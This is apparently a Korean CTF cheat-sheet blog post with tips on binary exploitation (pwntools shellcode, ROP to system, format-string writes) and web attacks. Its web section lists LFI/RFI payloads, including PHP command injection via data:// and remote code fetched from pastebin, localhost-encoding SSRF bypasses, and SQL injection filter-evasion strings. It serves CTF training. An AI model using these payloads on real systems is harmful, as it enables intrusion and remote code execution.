---
layout: post
title: CTF Tips
author: "Realsung"
comments: true
featured: true
sitemap :
  changefreq : ctftips
  priority : 1.0
---

# Binary Tips

```
file 명령어로 봤을 때 stripped 돼있고 main 함수가 안 보인다면 start로 가면 libc_start_main으로 콜하는 데 그 중에서 첫번째 인자로 들어가는 주소가 main함수이다.

윈도우 바이너리 같은 경우는 start에서 2번째 호출되는 함수의 exit()의 인자로 들어가는 result 가 main이다.
```

<br />

> pwntools Create Shellcode 

```python
asm(shellcraft.amd64.sh(), arch='amd64')
```

<br />

> pwntools libc symbol

```python
leak_libc = ELF('./leak_libc')
libc_system = libc_base_addr + leak_libc.symbols['system']
```

<br />

> 64 bit ROP

```
[buf] +  gadget [pop rdi; ret] + [/bin/sh string addr] + [system addr]
```

<br />

> Function Offset 

```python
printf_off = e.symbols['printf']
system_off = e.symbols['system']

libc_base = printf - printf_off
system = libc_base + system_off

binsh = libc_base
binsh += e.search('/bin/sh').next()
```

<br />

> FSB

스택 내 주소 한번에 출력

스택의 1337번째의 값을 hex 값으로 출력 (info leak)

```c
printf("%LENGTH$08x"); -> printf("%1337$08x");
```

주소 값 한 번에 변조 

스택의 12번째의 값에 저장되어 있는 주소에 앞에 출력된 바이트 수만큼 덮음

```c
printf("%LENGTH$n"); -> printf("%12$n");
```

> nc tip

nc로 바이너리가 주어질 때 있는데 아래처럼 바이너리 같은지 확인 가능하다.

```
$ nc 주소 > 1
$ nc 주소 > 2
$ nc 주소 > 3
$ nc 주소 > 4
$ nc 주소 > 5
$ md5sum * 
$ rm *
```

<br />

# Python Tips

> xor

두 개의 문자 xor연산 할 때 itertools cycle 모듈 사용해서 인덱스가 끝나도 처음으로 가서 계속 xor 연산 가능

zip 함수는 두 개의 리스트의 같은 인덱스를 짝 지어준다.

Ex) [1,2] [3,4] 있으면 (1,3) (2,4) 이런식으로

```python
from itertools import cycle
a="Eo@GxVoclNqioF^tkF^clNqyoFe}"
b="\x03#\x01\x00"
flag=""
for x,y in zip(a,cycle(b)):
	flag += chr(ord(x)^ord(y))
print flag
```

<br />

> ctypes

아래 예제처럼 응용

```python
from ctypes import CDLL
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6") # Windows -> msvcrt
libc.srand(libc.time(0))
libc.rand()
```

<br />

> BruteForce

이런식으로 리스트의 모든 조합의 경우를 구할 수 있다. 

```python
from itertools import permutations
a=[1,2,3]
table = permutations(a)
# 만약 2개씩 짝 지을거면 permutations(a,2)
for i in table:
  print list(i)
```

> ida python 

```
ifind('call') : 호출되는 함수볼 수 있음
```

<br />

# Web Tips

> Use python requests

```python
import requests

req = requests.post('주소', data={'name': value, cookies={'PHPSESSID': session})
```

```python
import requests
head={'user-agent': 'Test'}
req = requests.get(ADDRESS, headers=head)
```

<br />

> Use cURL

```shell
curl -d "id=admin&pw=admin&press=Login" ADDRESS
```

```shell
curl ADDRESS -H 'header: header' --data 'data=data'
```

<br />

> Magic hash

```php
"0e1354" == "0e87453" // true
"0" == "0e7124511451155" //true
"0" == md5("240610708") // true
"0" == sha1("w9KASOk6Ikap") // true
md5("QLTHNDT") == md5("QNKCDZO") // true
```

[Link](https://www.whitehatsec.com/blog/magic-hashes/)

<br />

> LFI & RFI

```
http://URL/?page=php://filter/convert.base64-encode/resource=index.php

http://URL/?page=php://filter/convert.base64-decode/resource=./upload/abcde

http://URL/?page=data://text/plain,%3Cxmp%3E%3C?php%20system($_GET[%27x%27]);&x=ls%20-al

http://URL/?page=http://pastebin.com/raw/abcd/?&x=ls%20-al
```

<br />

> 127.0.0.1

```
http://2130706433

http://0x7f000001

http://0x7f.0x00.0x00.0x01

http://017700000001

http://0177.000.000.01
```

<br />

> MySQL

```
다음 라인 : %0a //주석처리를 하더라도 다음 줄로 넘겨버리면 무시된다.
주석 처리 : -- # ;%00 /**/
파라미터가 두개 있을경우 \를 입력해 뒤의 '를 무력화 후 쿼리문을 스트링화 시키고 뒤에 파라미터에 exploit을 수행할 수 있다.
%0a 말고도 %0b 등 대신 쓰일 수 있는 여러문자들이 있다.
비교 문자 : = like in strcmp()
문자 자르기 : strcmp left right mid Function
and == &&, or ==||
if ord Function Filtering : conv(hex(substr(pw,1,1)),16,10)
공백 대신 : /**/ %09 %0a ()
IF(substr(lpad(bin(ord(substr(password,1,1))),8,0),1,1)
```

<br />

> SQLI

String Filtering [ preg_match - ex) admin]

```php
admin : 0x61646d696e 0b0110000101100100011011010110100101101110 char(0x61, 0x64, 0x6d, 0x69, 0x6e)
```

<br />

Blind SQL Injection Equal(=) Filltering

```php
substr('abc',1,1)like('a')
if(strcmp(substr('abc',1,1),'a'),0,1)
substr('abc',1,1)%20in('a')
```

<br />

substr Filtering

```php
right(left('abc',1),1)
id > 0x41444d4941 'ADMIN' > 'ADMIA'(hex)
```

<br />

ereg, eregi

```php
'admin' Filtering -> 'AdmIN' bypass
FRONT %00 INSERT -> 뒤에 문자 필터링 처리 안됨
```

<br />

replace, replaceAll, str_replace

```php
'admin' Filtering -> 'adadminmin' 'adadmimin' 'admadminin' 'admdmiadmdmiinin'
```

<br />

Numeric Character Filtering

```php
0 -> '!'='@' -> false
1 -> '!'='!' -> true
```

<br />

White Space Filtering (%20)

```
%20 -> %0a %0b %0c %0d %09
```

<br />

Single Quoter Filtering (%27)

```php
Use Double Quote in Single Quote
if '\' not Filtering
-> select TEST from TABLE where id='\' and pw=' or 1#
parameter : id=\&pw=%20or%201%23
```

<br />

Comment Injection

```php
'#'의 주석 범위는 1 line이다. 1 line을 나누는 기준은 %0a로 나눈다.
-> select test1 from TABLE where id='abc'# and pw='%0a or id='admin'%23
'/* */'
-> select test1 from TABLE where id='abc'/* and pw=''*/ or id='admin'%23
```

<br />

Table and Column

```mysql
select test1 from test where id='admin' and pw='1234' procedure analyse();
```

-> Use with limit 2,1

<br />

SQL Injection Attack Success

```
Use '(Single Quoter) Error
-> ' and '1'='1 , ' and '1'='2
앞은 정상적 출력되고 뒤는 출력이 안나면 성공
' or '1'='1 -> 정상 출력 되면 성공
Number Column
-> if idx=23001 == idx=23002-1 이렇게 넣었을때 정상 출력 되면 성공
Comment
-> #(%23), -- (--%20), %0a
```

<br />

Filtering

```
=이 필터링 되었을 때
1' or 2>1 -- 이렇게 조건 참 만들어서 인젝션할 수 있다.

../를 replace해주면 .././로 "../"로 만들 수 있다.
```

<br />

Unpacking js

```
console.log()
```

<br />

*Reference by ar9ang3*